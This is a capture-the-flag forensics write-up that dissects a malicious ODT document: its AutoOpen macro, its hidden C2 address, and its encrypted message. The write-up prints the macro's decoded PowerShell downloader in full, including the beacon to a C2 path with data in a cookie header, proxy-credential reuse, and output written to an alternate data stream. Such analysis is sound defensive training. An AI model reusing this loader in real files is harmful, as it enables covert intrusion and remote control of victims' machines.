---
title: "Forensics Practice3 ECSC Spain 2023"
date: 2023-09-01T23:17:41+02:00
author: l0w3
---

## Forensics Challenge Forensics Challenge ECSC Team Spain 2023 - Third Practice

In this set of challenges we were given an `odt` file and we had to find several pieces of information, so let's dive into it.

>The order of resolution does not match the order prupposed by the challenges due to the easiness to find some pieces of info straight from the files rather than doing any type of analysis.

### Preprocessing

Before doing any type of analysis, I had to know what I was dealing with, so I ran the `file` command

```bash
file reto12.odt 

reto12.odt: Zip archive data, at least v1.0 to extract, compression method=store
```
The file type results to be a `zip` file, so I extracted it with the `unzip` command

```bash
unzip reto12.odt 

Archive:  reto12.odt
   creating: Basic/
  inflating: Basic/script-lc.xml     
   creating: Basic/Standard/
  inflating: Basic/Standard/AutoOpen.xml  
  inflating: Basic/Standard/script-lb.xml  
 extracting: comment.zip             
  inflating: content.xml             
   creating: media/
  inflating: media/image1.png        
  inflating: media/image2.jpeg       
  inflating: media/sound1.mp3        
   creating: META-INF/
  inflating: META-INF/manifest.xml   
  inflating: meta.xml                
 extracting: mimetype                
  inflating: settings.xml            
  inflating: styles.xml   
```

Now, we can work with this files and start analyising them

### What type of `kdf` was used as part of the algorighm that encrypts the message?

`kdf` stands for Key Derivation Function. With that in mind, I digged around trying to find something on the sources of the document.

Looking at the `comment.xml` file, I see something interesting:

>Encryption algorithm: AES-128. Key derivation function: PBKDF2

There we have our answer!

`flag: PBKDF2`

### Which is the encoding used during the flag transmision?

On the `Basic` folder there were some `VB` scripts, one of them being an `AutoOpen sub` that would execute a piece of code upon opening the document.

When taking a look at this file, we see that there is an encoded command that is supposed to run with `powershell`, but it's encoded in what appears to be `base64` so I decoded it with [cyberchef](https://cyberchef.org/)

```text
$xowr94z=new-object system.net.webclient;$sre=$([text.encoding]::ascii.getstring([convert]::frombase64string($args[0])));$x='/news.php';$xowr94z.headers.add('user-agent','mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.) like gecko');$xowr94z.proxy=[system.net.webrequest]::defaultwebproxy;$xowr94z.proxy.credentials=[system.net.credentialcache]::defaultnetworkcredentials;$script:proxy=$xowr94z.proxy;$kkkk=[system.text.encoding]::ascii.getbytes('70885399c892ca0325v7fe8cb204cd3e');$xowr94z.headers.add('cookie',$([convert]::tobase64string([system.text.encoding]::unicode.getbytes($args[1]))));$xowr94z.downloaddata('http://'+$sre+$x)|out-file "c:\\:c"
```

Awesome. Upon reading this some times I see that there are two encodigns being used here, `base64` and `ascii`. There is few context on what is supposed to be the flag, but we can decude that it might be the string on the `cookie` header, which is being encoded in `base64`, and indeed, that's the answer.

`flag: base64`

### Which protocol is being used to transmit the flag?

Since it is an HTTP request, the protocol in use is `http`

`flag: HTTP`

### Which header field is being used to send the flag?

As stated previously, the field that sends the flag is quite likely to be the `cookie` heaer

`flag: cookie`

### Where is the response of the C2 stored?

On the prevous `powershell` command, we can see that it pipes the output of the command to an outfile called `c:\\:c`, so it is storing the output on that file.

`flag: c:\\:c`

### Which is the C2 IPv6:PORT

This question was way more interesting, or at least different to the others hehe. Upon looking at all the documents without seeing any indications of a `IPv6` address, I looked at the media files. We are given three files: two images and one auido. I decided to listen to the audio. It was just random noise. I remembered a CTF I solved quite some time ago, where an audio file with a extrange sound on it was holding a secret message on it's spectrogram. I decided to apply this and see if I could see something interesing on there.

I downloaded `sonic-visualiser` and then opened the file and viewed the spectrogram of it.

Awesome, it looks like a `base64` string. Let's see it's contents

```bash
echo "W2ZkMDE6MDoyNTU6ODc4OjJhMDk6OmJlZWY6MTgzXTozMTMzNw==" | base64 -d

[fd01:0:255:878:2a09::beef:183]:31337
```
`flag: [fd01:0:255:878:2a09::beef:183]:31337`

### Which is the content of the message?

Now that we are on stego mode, I decided to look at the images and see if there was something in there. First I ran `exiftool` on both images and in one of them there was something juicy:

```bash
exiftool image2.jpeg

=== SNIP ===
Document Notes: Password is blackRh!no48
=== SNIP ===
```

Although I had this password, I had no idea on where to use it, so I started to look at things that might need a password. Going back to the encryption of the message, I saw this interesting info about the `kdf` being used:

>In cryptography, PBKDF1 and PBKDF2 (Password-Based Key Derivation Function 1 and 2) 

So, as it's password-based, we might be able to decrypt it using that one.

```bash 
openssl enc -aes128 -d -k 'blackRh!no48' -out decrypted -in encrypted -pbkdf2
```

This prouced a new file containing the text of the message, which was:

```text
The answer is fc72b8656ffd25
```

Cool!! so we decrypted the message and have our flag:

`flag: fc72b8656ffd25`

### Which is the IV used to decrypt the flag?

Upon further analysing, I saw that there was a `.zip` file that we could not decompress because it needed a passowrd. I tried all the ones I had up to now, and the one that appeared to work was the one found in the previous flag. Inside it, there was a comment.xml file with all the encryption data used to encrypt the flag

```xml
<?xml encoding="utf-8" version="1.0">

<!-- The following is necessary to win                 -->
<!--                                                   -->
<!-- Encryption algorithm: AES-256                     -->
<!-- Mode of operation: CTR                            -->
<!-- Key: QIEYD8crhlb/0v9pl1OZTi3JtZ16h4Lx9D4wWxLn7Ww= -->
<!-- IV: "4185115006824300"                            -->
```
And there is our flag. We just have to convert it into hex format

`flag: 34313835313135303036383234333030`
